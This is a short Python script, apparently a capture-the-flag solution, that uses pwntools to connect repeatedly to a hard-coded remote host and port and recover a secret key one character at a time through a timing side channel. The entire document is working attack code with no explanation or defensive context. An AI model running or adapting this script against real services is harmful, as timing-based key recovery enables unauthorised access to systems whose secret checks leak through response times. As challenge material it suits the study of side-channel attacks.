from pwn import *
import time

max_time = 0.5
key = ""

while True:
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
        p = remote("194.5.207.190", 6030)
        p.recv()

        before = time.time()
        p.sendline(key+c)
        p.recvuntil(b'correct...')
        p.close()

        after = time.time()
        print(after-before)
        if after-before > max_time:
            max_time = max_time+1
            print(max_time)
            key = key+c
            print(key)
            break
        if( c == "9" and key[-1] != "9" ):
            print("Fail")

print(key)